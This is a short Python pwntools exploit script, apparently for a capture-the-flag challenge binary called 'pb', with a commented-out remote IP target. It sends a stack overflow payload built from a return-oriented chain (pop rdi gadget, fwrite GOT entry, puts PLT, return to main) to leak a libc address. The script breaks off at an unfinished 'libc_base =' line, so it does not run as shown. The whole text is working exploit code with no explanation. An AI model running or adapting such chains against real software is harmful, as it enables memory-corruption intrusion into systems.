import pwn
from pwn import *
#context.log_level = 'DEBUG'
context.binary = "pb"
p = process("./pb")
#p = remote("68.183.45.143",31486)
overwrite = b"A"*56
pop_rdi = p64(0x000000000040142b)
fwrite_at_got = p64(0x403fe8)
puts_at_plt = p64(0x401030)
safe_main = p64(0x00000000004013a6)
libc = ELF("./glibc/libc.so.6")
p.sendlineafter(b">> ",b"2")
payload = overwrite + pop_rdi + fwrite_at_got + puts_at_plt + safe_main
p.sendlineafter(b": ",payload)
p.recvuntil(b"you!")
leak = u64(p.recv(8).strip().ljust(8, b"\x00"))
log.info(f"{hex(leak)=}")
libc_base = 

p.interactive()
